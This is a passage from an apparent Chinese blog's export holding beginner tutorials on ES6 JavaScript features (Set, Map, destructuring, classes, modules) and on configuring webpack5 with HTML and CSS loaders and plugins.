//促销产品打折前价格:采用链式编程，过滤-&gt;映射-&gt;汇总 let afterSum = goods.filter(n =&gt; n &gt;= 10) .map(n =&gt; n * 0.5) .reduce((s, n) =&gt; s += n); //-----这两个其实都是一样的故意用两种写法 因为箭头函数中只有一条语句可写可不写 return + {} ----- //reduce 如果不传参默认就是 0，如果传参的话写在箭头函数 } 的后面，用逗号分割参数 //促销产品打折后价格: 采用链式编程，过滤-&gt;映射-&gt;汇总 let beforeSum = goods.filter(n =&gt; { return n &gt;= 10}) .map(n =&gt;{ return n}) .reduce((s, n) =&gt; { return s += n},0) console.log(\"促销产品原始总价：\"+beforeSum+\",促销产品打折后总价：\"+afterSum+\",少盈利：\"+(beforeSum-afterSum)); 数据结构集合set简介 set 集合和 java 的 set 集合差不多 集合中只能存放值，没有键，相同的值只能存储一个 一个 set 集合中可以同时存放不同的数据类型，比如整型，字符串，数组等 示例 常用方法：add delete has size forEach clear 点击显/隐代码块 const obj = new Set(); // add 添加数据 obj.add(1); // 添加数据重复数据是无效的 obj.add(1); console.log(obj); obj.add(5); obj.add([\"ada\", 25, \"测试\"]); console.log(obj); // 判断集合中是否有 1，返回的是一个布尔值 console.log(obj.has(1)); //删除集合中等于 2 的值，删除成功返回 true ，删除失败返回 false，这里面没有 2 就会删除失败返回 false console.log(obj.delete(2)); // 两种遍历方式 obj.forEach(n =&gt; console.log(\"forEach遍历结果：\" + n)) for (let n of obj) { console.log(n); } //清空集合 obj.clear(); //获取集合大小 console.log(obj.size); map简介 也和 java 的差不多，通过键值对存储 key-&gt;value Map 数据结构类似于对象，是键值对的集合，传统的键只能用字符串，Map 的键不限于字符串，各种类型的值（包括对象）都可以当作键。 属性和操作方法 size 属性，返回 Map 结构的成员总数 set(key,value)方法，设置set方法设置键名key对应的键值为value，然后返回整个 Map 结构。如果key已经有值，则键值会被更新，否则就新生成该 get(key) 方法，读取key对应的键值，如果找不到key，返回undefined has(key) 方法，返回一个布尔值，表示某个键是否在当前 Map 对象之中。 delete(key) 方法，删除某个键，返回true。如果删除失败，返回false。 clear(key) 方法，清除所有成员，没有返回值。 Map 遍历 keys() 返回键名的遍历器 values() 返回键值的遍历器 entries()返回所有成员的遍历器 forEach()遍历Map的所有成员 示例 常用方法：set get forEach has size 点击显/隐代码块 const mapObj = new Map(); mapObj.set(\"name\", \"ada\"); mapObj.set(\"age\", 25); console.log(mapObj); console.log(mapObj.get(\"name\")); // 重复的key,value 会覆盖 上面输出的 ada 下面输出的 阿达 mapObj.set(\"name\", \"阿达\"); console.log(mapObj.get(\"name\")); //遍历 和 java 的 lambda 一样一样的 mapObj.forEach((k,v)=&gt;console.log(\"key:\"+k+\",value:\"+v)) //删除 age console.log(mapObj.delete(\"age\")); //判断是否有 name console.log(mapObj.has(\"age\")); //获取大小 console.log(mapObj.size); 字符串新功能 startsWith 判断以什么字符串开头 endsWith 判断以什么字符串结尾 模板字符串 判断开头与结尾点击显/隐代码块 let url = \"www.adalucky.com\" /** * * @param s 域名.前面部分 * @param e 域名.后面部分 * @returns {string} */ const fun = (s, e) =&gt; { if (url.startsWith(s+\".\") &amp;&amp; url.endsWith(\".\"+e)) { // return \"是一个标准的【\"+s+\"】开头，【\"+e+\"】结尾的域名\" // 上面注释的是普通字符串拼接的变量，下面是用模板字符串 `` ${} 引用变量 return `是一个标准的【${s}】开头，【${e}】结尾的域名` } else { return \"不是一个标准的【www】开头，【com】结尾的域名\" } } console.log(fun(\"www\", \"com\")); console.log(fun(\"www.\", \".com\")); console.log(fun(\"test\", \"vip\")); 模板字符串 模板字符串 ``定义字符 ${} 引用变量 支持换行 点击显/隐代码块 let title = \"这是标题\"; let slogan = \"这是标语 slogan\"; //里面还可以拼接标签 &lt;title&gt;${title}&lt;/title&gt; 这使用方法，换行会直接换行 let str = `模板字符串中直接引用变量不需要用加号隔开 ${title} ${slogan} ` console.log(str); //换行也会自动用加号拼接 最后打印都是一行 let str2 = \"字符串拼接\" + title + slogan console.log(str2); 解构赋值简介 解构赋值，序列解包， 注意事项：结构构必须一样，比如数组两边都需要用数组[a,b,c]=[1,2,3] 对象{UserName,UserAge,UserSex}={“name”: “ada”, “age”: “25”, “sex”: “男”} 接受的参数个数不能操作数据的长度，可以少，当少于长度时按照从左到右顺序解构 解构赋值不能像定义变量一样分开声明和赋值，例如 let [a,b]; [a,b]=[1,2] 基础的解构点击显/隐代码块 let arr = [1, 2, 3]; let a = arr[0]; let b = arr[1]; let c = arr[2]; console.log(`a=${a},b=${b},c=${c}`); const obj = {\"name\": \"ada\", \"age\": \"25\", \"sex\": \"男\"}; let UserName = obj.name; let UserAge = obj.age; let UserSex = obj.sex; console.log(`name:${UserName},age:${UserAge},sex:${UserSex}`); 点击显/隐代码块 let arr = [1, 2, 3,4]; //等号右边可以是引用的数组，也可以直接显示声明数组 [a, b, c] = [1, 2, 3,4] //两边的结构保持一致都是数组，接受的参数个数可以小于数组的长度 不能超出长度 let [a, b, c] = arr; console.log(`a=${a},b=${b},c=${c}`); //直接显示声明，对象结构的是按照 key 取得所有参数名和对象中的 key 要一致，顺序无所谓 let {age,sex,name} = {\"name\": \"ada\", \"age\": \"25\", \"sex\": \"男\"}; console.log(`name:${name},age:${age},sex:${sex}`); 复杂的解构 这种复杂的一般比较少不常用 ①先确定外层结构两边保持一至 ②内层结构中有对象+数组的 那么用 对象名:[] 来二次结构 ③对象的数组中又有对象用，对象名:[{对象名}] 点击显/隐代码块 //较为复杂的组合结构 ①先确定外层结构两边保持一至 ②内层结构中有对象+数组的 那么用 对象名:[] 来二次结构 ③对象的数组中又有对象用，对象名:[{对象名}] let [one, two, three, four] = [{\"name\": \"ada\", \"age\": \"25\"}, [1, 2, 3], \"字符串\", 10]; console.log(one, two, three, four); let [{name, age}, [a1, b1, c1], str1, number1] = [{\"name\": \"ada1\", \"age\": \"25\"}, [1, 2, 3], \"字符串\", 1]; console.log(name, age, a1, b1, c1, str1, number1) let {obj, arr, str2, number2} = {\"obj\": [{\"name\": \"ada\", \"age\": \"25\"}], \"arr\": [15, 25, 35], \"str2\": \"字符\", \"number2\": 2} console.log(obj, arr, str2, number2) { let {obj:[{name,age}], arr:[a,b,c], str3, number3} = {\"obj\": [{\"name\": \"ada3\", \"age\": \"27\"}], \"arr\": [25, 35, 45], \"str3\": \"字符\", \"number3\": 10} console.log(name, age,a,b,c ,str3, number3) } { let {name, age, child:{firstChild}}= {name: 'zxj', age: 12, child: {firstChild: '小明'}}; console.log(name,age,firstChild) } 扩展运算符简介 …三点运算符 展开数组 默认参数 和java 中的可变参数一样 数组展开放入 先展开数组然后按照所在位置存入数组中 点击显/隐代码块 let arr1 = [1, 2, 3]; let arr2 = [15, 30, 50]; // 三个点展开数组然后放进数组中 let arr3 = [...arr1, 7, 8, 20, ...arr2]; console.log(arr3); console.log(arr3[5]); const argsFun = (arr1,arr2) =&gt; { console.log(arr1,arr2) } argsFun(...arr1) 参数传递 如果方法中有自定义的参数和需要可变参数，可变参数需要放在最后一个形参中 点击显/隐代码块 let arr1 = [1, 5, 3,7,9]; //调用方法是作为参数传递，方法中只需要 2 个参数就会取数组中的前 2 个值 const argsFun = (arr1, arr2) =&gt; console.log(arr1, arr2) argsFun(...arr1) //方法中用 ...args 作为可变参数，传进来的会当成一个数组处理，也可根据 ...args 的下标取值 const argsFun2 = (...args) =&gt; { console.log(...args) console.log(...args[2]) } argsFun2(20, \"测试\", \"男\", \"ada\") //如果方法中有自定义的参数和需要可变参数，可变参数需要放在最后一个形参中 //定义的argsFun3中有 2个参数str,number和一个可变参数 ...args 调用的时候只传了一个 str 和一个展开的数组，展开的数组的第一个就会赋给 number，剩下的给可变参数 ...args const argsFun3 = (str,number,...args)=&gt;console.log(`str的值为: ${str},number的值为: ${number},args的值为: ${args}`) argsFun3(\"字符\",...arr1) class简介 ES6之前 JavaScript 叫做基于对象，ES6 新增了 Class（类）的概念，可以说是面向对象的 constructor 是构造方法 this关键字代表实例对象 通过extends关键字实现继承 super关键字，表示父类的构造函数，用来新建父类的this对象 对比 通过截图中左右两段代码可看出来 ES6 的定义类、方法、构造方法层次更加清晰 点击显/隐代码块(ES6before) //ES6 前既是构造函数又是方法 function Person(name, age, sex) { this.name = name; this.age = age; this.sex = sex; this.say = function () { console.log(`我是${this.name}`); } this.run = function () { console.log(\"跑起来吧\"); } } let user = new Person(\"ada\", 25, \"男\") console.log(user); console.log(user.age); user.say(); user.run(); 点击显/隐代码块ES6after class Person { //constructor 构造方法关键字 constructor(name, age, sex) { this.name = name; this.age = age; this.sex = sex; } say() { console.log(`我是${this.name}`); } run() { console.log(\"ES6后面跑起来了\") } } let es6User = new Person(\"阿达\", 20, \"男性\") console.log(es6User); console.log(es6User.sex); es6User.say(); es6User.run(); 继承 继承通过关键字 extends 实现 子类如果重写了父类的方法调用的是子类自己的方法 子类的方法中如果需要调用父类的其它方法可以使用 super.run() super.say() 这种方式 点击显/隐代码块 class Person { constructor(name, age, sex) { this.name = name; this.age = age; this.sex = sex; } say() { console.log(`我是父类的${this.name}`); } run() { console.log(\"ES6后面跑起来了\") } } class students extends Person{ //子类的构造方法，因为我们子类只新增了一个school参数，那么可以用之前的可变参数 ...args 优雅 constructor(school,...args) { //在子类的构造方法中调用父类的构造方法后再把新增的 school也给初始化 super(...args); this.school = school; } //子类重写父类的对象方法 say() { console.log(`我是子类的${this.name}`); } } let es6Student = new students(\"十八线学校\",\"阿达\", 20, \"男性\") console.log(es6Student); es6Student.say(); JSON简介 JSON.stringify() 串行化 JSON.parse() 反串行化 简写 (属性和值)名字一样可以简写 方法一样可以简写（:function省） 简写点击显/隐代码块 const user1 = {name: \"ada\", age: \"20\", sex: \"男\"} console.log(user1); let name = \"阿达\"; let age1 = 20; //简写：name:name --&gt; 简写 name 既是键又是值的引用, age不行，因为对象的 key 叫 age，变量名叫 age1 const user2 = {name, age: age1, sex: \"男\"} console.log(user2); const user3 = { // 对象里面再套一个方法 say:function ()---&gt;简写为 say() name, age1, sex: \"男\", say() { console.log(this.name); } } user3.say(); 串行化、 反串行化 串行化：JSON 对象转成 字符串 反串行化：JSON 格式的字符串转成 JSON 点击显/隐代码块 const user3 = { // 对象里面再套一个方法 say:function ()---&gt;简写为 say() name:\"ada\", age:25, sex: \"男\", say() { console.log(this.name); } } let str = JSON.stringify(user3); console.log(str); console.log(str.name); //会输出 undefined，此时的 str 已经被串行成了字符串，没有 name 的属性 let json = JSON.parse(str); console.log(json.name); json.say(); //这一句就会报错，因为上面串行化的时候已经丢失了 say 的方法 Module模块化简介 模块化优点：减少命名冲突 避免引入时的层层依赖 可以提升执行效率 export命令：用于规定模块的对外接口，一个模块就是一个独立的文件。该文件内部的所有变量，外部无法获取。如果你希望外部能够读取模块内部的某个变量，就必须使用export关键字输出该变量。 import命令：用于输入其他模块提供的功能，import命令接受一对大括号，里面指定要从其他模块导入的变量名。大括号里面的变量名，必须与被导入模块（profile.js）对外接口的名称相同。 冲突示例 当我们在 html 中引入的 js 时，多个 js 存在重复的变量名、方法名、函数名，就会发生冲突，已经命名的不能重复命名 解决方法：给每个 js 文件类型都设置成 module，这样都是独立的了 导入导出 坑：如果是用 node 运行，导入导出使用的关键分别为 require module.exports 坑：如果是用 浏览器 运行，导入导出使用的关键分别为 import export 注意事项：如果是用 node 运行,文件后的 .js 可以不写，如果是浏览器运行导出的文件必须写后缀 .js （这里不包含打包工具处理哈，可能有些打包工具会自动处理上述问题） 导出的时候可以整体用一个 export {导出1,导出 2,…} 也可以在单个上用 export 导出 导入导出时需要使用到解构赋值 JSON 简写 的方式比较简便 示例一 导入时有命名冲突的可在导入方用 as 起别名 点击显/隐代码块(one.js) //导出 简写 x:x y:y json中支持的简写方式 既是Key又是value //如果是用 node 运行，导出关键字为 module.exports，如果是浏览器运行导出的关键字为 export // module.exports ={x, y,mun}; export {x, y, mun}; let x = 10; let y = 5; let mun = (i, j) =&gt; \"这是one.js返回的：\" + i * j; // console.log(mun(x, y)); 点击显/隐代码块(two.js) export {add, mun,Person} let name = \"ada\"; let age = 25; let sex = \"男\"; const add = (a, b) =&gt; a + b; let mun = (i, j) =&gt; \"这是two.js返回的：\" + i * j; class Person { say() { console.log(\"two.js中 Person 类的 say 方法\") } } 点击显/隐代码块(index.js) //如果是用 node 运行，导入关键字为 require,文件后的 .js 可以不写，如果是浏览器运行导出的关键字为 import，文件后的 .js 必须写 // let {x, y, mun} = require('./two'); import {x,y,mun} from \"./one.js\"; import {add,mun as mun2,Person} from \"./two.js\" //如果有命名冲突的可以再导入方 as 起个别名 console.log(mun(x, y)); console.log(mun2(x, y)); let per =new Person(); per.say(); 点击显/隐代码块(index.html) &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;script src=\"index.js\" type=\"module\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; 示例二 导出时一个 js 文件最多可以定义一个匿名的 default 导出，由导入方定义名称 导出的时候也可以通过 as 起别名 导入的时候可以用 * as name 把暴露的接口都整合在一个对象中，使用时直接用这个对象来操作 点击显/隐代码块(dome.js) export {x, y }; let x = 10; let y = 5; //匿名的，导出方不需要定义名称，导入方自定义，一个 js 文件中只能有一个 default，需要单独写 export export default (i, j) =&gt; \"这是one.js，default返回的：\" + i * j; 点击显/隐代码块(user.js) export {name as myName, age, sex, Person} let name = \"ada\"; let age = 25; let sex = \"男\"; class Person { say() { console.log(\"user.js中 Person 类的 say 方法\") } } 点击显/隐代码块(index.js) import {x,y} from \"./dome.js\"; //导入方自定义 dome.js 中的匿名函数，需要单独写一个 import 不能放在 {x,y} 中 import test from \"./dome.js\"; // 导入user.js 中暴露出来的接口，并起个别名为 user import * as user from \"./user.js\" console.log(test(x, y)); console.log(user.myName); let p = new user.Person(); p.say(); 点击显/隐代码块(index.html) &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;script src=\"index.js\" type=\"module\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt;","categories":[{"name":"Auto","slug":"Auto","permalink":"https://www.adalucky.com/categories/Auto/"}],"tags":[{"name":"前端基础","slug":"前端基础","permalink":"https://www.adalucky.com/tags/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/"},{"name":"ES6","slug":"ES6","permalink":"https://www.adalucky.com/tags/ES6/"}],"author":"Ada"},{"title":"webpack5","slug":"Auto/webpack5","date":"2022-02-22T10:00:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/auto/webpack5/","link":"","permalink":"https://www.adalucky.com/auto/webpack5/","excerpt":"webpack 是代码编译工具，有入口、出口、loader 和插件。webpack 是一个用于现代JavaScript应用程序的静态模块打包工具。当 webpack 处理应用程序时，它会在内部构建一个依赖图(dependency graph)，此依赖图对应映射到项目所需的每个模块，并生成一个或多个 bundle","text":"webpack 是代码编译工具，有入口、出口、loader 和插件。webpack 是一个用于现代JavaScript应用程序的静态模块打包工具。当 webpack 处理应用程序时，它会在内部构建一个依赖图(dependency graph)，此依赖图对应映射到项目所需的每个模块，并生成一个或多个 bundle 参考资料 简介安装配置简介 webpack 是一个模块打包器(构建工具)。它的主要目标是将 JavaScript 文件打包在一起，打包后的文件用于在浏览器中使用，但它也能够胜任转换（transform）、打包（bundle）或包裹（package）任何资源(resource or asset)。 官网： https://webpack.js.org/ 中文文档：https://webpack.docschina.org/ webpack原理和概念 树结构: 在一个入口文件中引入所有资源，形成所有依赖关系树状图 模块：模块就是模块可以是ES6模块也可以是commonJS或者AMD模块，对于webpack来说，所有的资源（css,img…） chunk：打包过程中被操作的模块文件叫做chunk,例如异步加载一个模块就是一个chunk bundel：bundle是最后打包后的文件,最终文件可以和chunk长的一模一样,但是大部分情况下他是多个chunk的集合 为了优化最后生产出的bundle数量可能不等于chunk的数量，因为有可能多个chunk被组合到了一个Bundle中。 graph LR A(webpack工作原理) --&gt;B1[png] A--&gt;B2[JPG] A--&gt;B3[CSS] A--&gt;B4[JS] B[chuck为打包过程bundle为打包结果] subgraph 资源 B1 --&gt; A1((A1)) B1 --&gt; A2((A2)) B2 --&gt;A3((B1)) B2 --&gt;A4((B1)) end subgraph 代码 B3 B4 end subgraph dist main.js end A1 --&gt;|chuck1| bundle1--&gt;main.js A2 --&gt; |chuck1|bundle1 A3 --&gt;|chuck1| bundle1 A4 --&gt; |chuck1|bundle1 A4 --&gt; |chuck2|bundle2--&gt;main.js B3 --&gt; |chuck2|bundle2 B4 --&gt; |chuck2|bundle2 webpack环境安装#安装webpack、webpack-cli至开发环境 i=install -D=--save-dev 注意看看pack.json webpack版本5+ webpack-cli4+ sudo npm i webpack webpack-cli -D -g sudo yarn add webpack webpack-cli -D -g webpack -v #打包 --mode指定模式 development开发模式（文件较大，包含注释等信息）,production生产模式（无注释，无空格全部在一行） 最终会在生成dist文件夹下有个main.js #生成模式打包后的文件更小，里面也没有多余的说明和注释等信息，默认是打包 src 下的文件，如果没有该文件夹会报错 webpack --mode development webpack --mode production webpack基础配置 项目根目录下，新建webpack.config.js文件（就用这个名字，换其它的名字需要在执行 webpack 命令的时候重新指定一遍，默认会读取这个名字的文件不需要指定） 该文件为执行 webpack 命令默认读取的配置文件 webpack默认打包js资源 点击显/隐代码块 //node中的包，可获取当前项目的根路径 const {resolve} = require(\"path\"); // webpack 的核心有五个: 1.entry 入口 2.output 输出 3.loader 4.plugin 插件 5.module module.exports = { // entry指示 webpack 应该使用哪个模块，来作为构建其内部 依赖图(dependency graph) 的开始。进入入口起点后，webpack 会找出有哪些模块和库是入口起点（直接和间接）依赖的.默认值是 ./src/index.js，入口配置3选一 //单入口：如果只有一个入口文件，使用字符串指定入口文件，打包一个chunk,名称是默认的（output中的filename的值build.js）输出一个bundle entry: \"./src/main.js\", //多入口：Array数组可多个入口文件，所有的入口文件生成一个chunk，名称是默认的（output中的filename的值build.js）输出一个bundle entry:[\"./src/main.js\",\"./src/index.js\"], //多入口：Object对象，通过Key：Value,配置多个入口，有几个入口文件就有几个chunk，并输出几个bundle，chunk的名称是key（output中的filename的值要写成\"[name].js\"） entry:{ test:'./src/one.js', index:'./src/index.js', main:'./src/main.js' } //混合模式 entry:{ //Array数组的多个打成1个test，其它的单独生成一个，filename的值还是写成[name].js test:[\"./src/main.js\",\"./src/index.js\"], index:'./src/index.js', main:'./src/main.js' } // output告诉 webpack 在哪里输出它所创建的 bundle，以及如何命名这些文件。主要输出文件的默认值是 ./dist/main.js，其他生成文件默认放置在 ./dist 文件夹 output: { //如果entry是object时，filename的值要写成\"[name].js\" filename: \"[name].js\", path: resolve(__dirname,\"build\") }, // loader webpack 只能理解 JavaScript 和 JSON 文件。loader 让 webpack 能够去处理其他类型的文件，并将它们转换为有效 模块，以供应用程序使用，以及被添加到依赖图中 module: { rules: [] }, //plugin loader 用于转换某些类型的模块，而插件则可以用于执行范围更广的任务。包括：打包优化，资源管理，注入环境变量 plugins: [], //模式（mode）指示webpack使用相应的配置，开发模式（development）：配置比较简单，能让代码本地调试运行的环境 生产模式（production）：代码需要不断优化达到性能最好，能让代码优化上线运行的环境 //都会自动启用一些插件，生产模式使用插件更多 mode: \"development\", // mode: \"production\", } html资源打包配置 由于webpack默认只能打包js资源，我们想要打包html资源需要在开发环境安装html-webpack-plugin插件 插件安装 插件3大步骤: 1.下载 npm i html-webpack-plugin -D 2.引入 const htmlWebpackPlugin = require(‘html-webpack-plugin’); 3.使用 new htmlWebpackPlugin(); #方式一：npm安装插件 npm i html-webpack-plugin -D #方式二：yarn安装插件 yarn add html-webpack-plugin -D 配置webpack.config.js文件 打包 html 文件 点击显/隐代码块 const {resolve} = require(\"path\"); const htmlWebpackPlugin = require('html-webpack-plugin'); // webpack 的核心有五个: 1.entry 入口 2.output 输出 3.loader 4.plugin 插件 5.module module.exports = { output: { filename: \"[name].js\", path: resolve(__dirname, \"build\") }, module: { rules: [] }, entry: './src/index.js', //plugin loader 用于转换某些类型的模块，而插件则可以用于执行范围更广的任务。包括：打包优化，资源管理，注入环境变量 plugins: [ //默认会创建一个空的，会自动引入 js 文件 new htmlWebpackPlugin( { //源文件(不指定template 就会自动生成一个空的 html 文件) template: \"./src/index.html\", //目标文件名（不指定filename 就会使用 template 的文件作为文件名，如果template也没有指定就会使用系统默认的 index.html） filename: \"demo.html\", // 压缩 minify: { collapseWhitespace: true, // 移除空格（结构中的空格，文字间的还是保留的） removeComments: true // 移除注释 } } ) ], mode: \"development\", } 分开打包 html 文件 不同的 html 文件需要引入不同的 js 文件，因此需要对不同的 js 文件分别或组合打包成一个bundle,在不同的页面中引用 点击显/隐代码块 //模拟真实打包 const {resolve} = require(\"path\"); const htmlWebpackPlugin = require('html-webpack-plugin'); module.exports = { mode: \"development\", entry: { // 将 common 和 jquery 依赖打包在一起，剩下的两个单独打包在一起 vendor: ['./src/js/common.js', 'jquery'], index: \"./src/js/index.js\", cart: \"./src/js/cart.js\" }, output: { filename: \"[name].js\", path: resolve(__dirname, \"build\") }, module: { rules: [] }, //plugin loader 用于转换某些类型的模块，而插件则可以用于执行范围更广的任务。包括：打包优化，资源管理，注入环境变量 plugins: [ new htmlWebpackPlugin({ //源文件(不指定template 就会自动生成一个空的 html 文件) template: \"./src/view/index.html\", //目标文件名（不指定filename 就会使用 template 的文件作为文件名，如果template也没有指定就会使用系统默认的 index.html） filename: \"demo.html\", chunks: ['index','vendor'], // chunks 中的值为 entry 中的键，多个bundle之间有依赖关系，从右往左写，数组中最后一个最先引入 // 压缩 minify: { collapseWhitespace: true, // 移除空格（结构中的空格，文字间的还是保留的） removeComments: true // 移除注释 } }), new htmlWebpackPlugin({ template: \"./src/view/cart.html\", filename: \"demo2.html\", chunks: ['cart','vendor'], minify: { collapseWhitespace: true, // 移除空格（结构中的空格，文字间的还是保留的） removeComments: true // 移除注释 } }) ] } css资源打包内联打包 实现原理：先用css-loader把 css 样式打包到 js 的一个bundle 然后用style-loader创建了一个&gt;标签引入样式,属于内联式打包 开发环境安装插件:css-loader style-loader css-loader:把css资源打包捆绑到js文件中（作用是处理css中的 @import 和 url 这样的外部资源） style-loader:把css加载引入到html中（作用是把样式插入到 DOM中，方法是在head中插入一个style标签，并把样式写入到这个标签的 innerHTML里） #方式一：npm 安装插件 npm i css-loader style-loader -D #方式二：yarn 安装插件 yarn add css-loader style-loader -D css资源打包到html webpack配置module标签 打包的 js 导入css文件(import/require) //打包index的时候会通过css-loder把css打到index.js中 require('./style.css') require('./lessstyle.less') require('./sassstyle.scss') console.log(\"这是入口文件\"); webpack.config.js配置点击显/隐代码块 //打包 css const {resolve} = require(\"path\"); const htmlWebpackPlugin = require('html-webpack-plugin'); module.exports = { mode: \"development\", entry: './src/demo/js/index.js', output: { filename: \"[name].js\", path: resolve(__dirname, \"build\") }, module: { rules: [{ // 两个斜杠表示正则,中间的.css$表示所有的.css结尾的文件 \"\\\"是用来转移\".\"的 test:/\\.css$/, //注意顺序,一定是style-loader在css-loader的左边,因为加载规则的时候是从右边到左 //1.通过css-loader把正则中的(这里也就是所有的css文件)打包到js中 //2.打包后再通过style-loader把这些插入到html中 use: ['style-loader','css-loader'] }] }, plugins: [ new htmlWebpackPlugin({ template: \"./src/demo/index.html\", filename: \"demo.html\", chunks: ['main'], minify: { collapseWhitespace: true, // 移除空格（结构中的空格，文字间的还是保留的） removeComments: true // 移除注释 } }) ] } Less/Sass资源打包 因为css只是单纯的属性描述,它并不具有变量、条件语句等,css的特性导致了它难组织和维护。 Sass和Less都属于CSS预处理器,定义了一种新的语言,其基本思想是用一种专门的编程语言,为 CSS增加一些编程的特性,将CSS作为目标生成文件,然后开发者使用这种语言进行CSS编码工作. Less需要使用npm下载less包和less- loader Sass需要使用npm下载node-sass包和sass- loader 需要在打包的 js 文件中引如 less sass 插件安装#Less的插件(开发环境) npm i less less-loader -D yarn add less less-loader -D #Sass的插件(开发环境) npm i node-sass sass-loader -D yarn add node-sass sass-loader -D webpack.config.js配置module: { rules: [ { // 两个斜杠表示正则,中间的.css$表示所有的.css结尾的文件 \"\\\"是用来转移\".\"的 test: /\\.css$/, //注意顺序,一定是style-loader在css-loader的左边,因为加载规则的时候是从右边到左 //1.通过css-loader把正则中的(这里也就是所有的css文件)打包到js中 //2.打包后再通过style-loader把这些插入到html中 use: ['style-loader', 'css-loader'] }, //先通过less-loader转成css,然后通过css-loader打包到入口文件js中,style-loader插入到html中,顺序从后往前 {test: /\\.less$/,use: ['style-loader', 'css-loader','less-loader']}, //sass原理一致,只是文件后缀名称是scss,所以正则的时候别写错了 {test: /\\.scss$/,use: ['style-loader', 'css-loader', 'sass-loader'] } ] }, less/sass 语法//less语法 //全局变量用@符号定义和引用 @color: red; @background: yellow; @width: 200px; @height: 300px; #lessBox { //局部变量 color: @color; width: @width*0.5; height: @height*0.33333; background: @background; } //sass语法 // sass 样式是以 scss 结尾的文件 定义变量用 $ //全局变量用$符号定义和引用 $color: blue; $background: black; $width: 200px; $height: 300px; #sassBox { //局部变量 color: $color; width: $width*0.8; height: $height*0.5; background: $background; } 单独打包样式文件 把less,sass,css等资源打包成一个独立的资源文件 下载插件 插件3大步骤: 1.下载 npm i mini-css-extract-plugin -D 2.引入 const miniCssExtractPlugin = require(‘mini-css-extract-plugin’); 3.使用 new miniCssExtractPlugin() # npm 下载 npm i mini-css-extract-plugin -D # yarn 下载 yarn add mini-css-extract-plugin -D webpack.config.js配置点击显/隐代码块 //将css less sass 资源 单独打包 成独立的文件 不嵌入在 js 中 const {resolve} = require(\"path\"); const htmlWebpackPlugin = require('html-webpack-plugin'); const MiniCssExtractPlugin = require('mini-css-extract-plugin'); module.exports = { mode: \"development\", entry: './src/demo/js/index.js', output: { filename: \"[name].js\", path: resolve(__dirname, \"build\") }, module: { rules: [ // 将 style-loader 换成 MiniCssExtractPlugin.loader {test: /\\.css$/, use: [MiniCssExtractPlugin.loader, 'css-loader']}, {test: /\\.less$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'less-loader'],}, {test: /\\.scss$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'sass-loader'],} ] }, plugins: [ new htmlWebpackPlugin({ template: \"./src/demo/index.html\", filename: \"demo.html\", chunks: ['main'], minify: { collapseWhitespace: true, // 移除空格（结构中的空格，文字间的还是保留的） removeComments: true // 移除注释 } }), new MiniCssExtractPlugin({ //指定单独打包的 css 文件的路径和文件名 output标签的 path 下的 ./css/demo.css filename:'./css/demo.css'}) ] } css兼容性处理 通过插件确保所有的css样式中的属性在所有类型的浏览器大多数浏览器的大多数版本都支持,且显示效果一致 需要使用postcss处理,下载两个包postcss-loader和postcss-preset-env posters会找到 package json中的 browserslist里面的配置,通过配置加载css的兼容性 修改loader的配置， 新版需要写postcss.config.js, less和sass兼容性同理 插件安装# npm 安装postcss-loader,postcss-preset-env 安装至开发环境 npm i postcss-loader postcss-preset-env -D # yarn 安装 yarn add postcss-loader postcss-preset-env -D 配置文件 需要新建 postcss.config.js文件、package.json中新增 browserslist 标签、webpack.config.js中使用 postcss-loader 新建 postcss 配置文件 项目根路径新建 postcss.config.js 文件，该文件为 postcss 的默认配置文件 // postcss 配置文件，该配置文件引入 postcss-preset-env 插件--&gt;该插件会读取 package.json文件下的 browserslist module.exports ={ plugins: [ require('postcss-preset-env')() ] } package.json文件配置信息{ \"devDependencies\": { \"css-loader\": \"^6.6.0\", \"html-webpack-plugin\": \"^5.5.0\", \"less\": \"^4.1.2\", \"less-loader\": \"^10.2.0\", \"mini-css-extract-plugin\": \"^2.5.3\", \"node-sass\": \"^7.0.1\", \"postcss-loader\": \"^6.2.1\", \"postcss-preset-env\": \"^7.3.3\", \"sass-loader\": \"^12.4.0\", \"style-loader\": \"^3.3.1\", \"webpack\": \"^5.68.0\", \"webpack-cli\": \"^4.9.2\" }, \"dependencies\": { \"jquery\": \"^3.6.0\" }, \"browserslistcomment\": \"支持80%以上的浏览器,支持最后两个版本,忽略已经死掉的浏览器\", \"browserslist\": [ \"&gt; 0.2%\", \"last 2 version\", \"not dead\" ] } webpack.config.js配置 执行 webpack 打包时如果 less scss 文件中有注释会出现如下截图报错，删除注释即可 //解决css less sass 兼容问题 const {resolve} = require(\"path\"); const htmlWebpackPlugin = require('html-webpack-plugin'); const MiniCssExtractPlugin = require('mini-css-extract-plugin'); module.exports = { mode: \"development\", entry: './src/demo/js/index.js', output: { filename: \"[name].js\", path: resolve(__dirname, \"build\") }, module: { rules: [ // 'css/less/sass-loader' 后新增 'postcss-loader' (postcss-loader 会去找到对应的配置文件 postcss.config.js---&gt;package.json下的browserslist属性) {test: /\\.css$/, use: [MiniCssExtractPlugin.loader, 'css-loader','postcss-loader']}, {test: /\\.less$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'less-loader','postcss-loader']}, {test: /\\.scss$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'sass-loader','postcss-loader'],} ] }, plugins: [ new htmlWebpackPlugin({ template: \"./src/demo/index.html\", filename: \"demo.html\", chunks: ['main'], minify: { collapseWhitespace: true, // 移除空格（结构中的空格，文字间的还是保留的） removeComments: true // 移除注释 } }), new MiniCssExtractPlugin({ //指定单独打包的 css 文件的路径和文件名 output标签的 path 下的 ./css/demo.css filename:'./css/demo.css'}) ] } 压缩 css 下载插件 optimize-css-assets-webpack-plugin 引入插件：const OptimizeCssAssetsWebpackPlugin = require(‘optimize-css-assets-webpack-plugin’); 使用插件： plugins: [ new OptimizeCssAssetsWebpackPlugin() ] 下载插件# npm 引入插件（开发环境） npm i optimize-css-assets-webpack-plugin 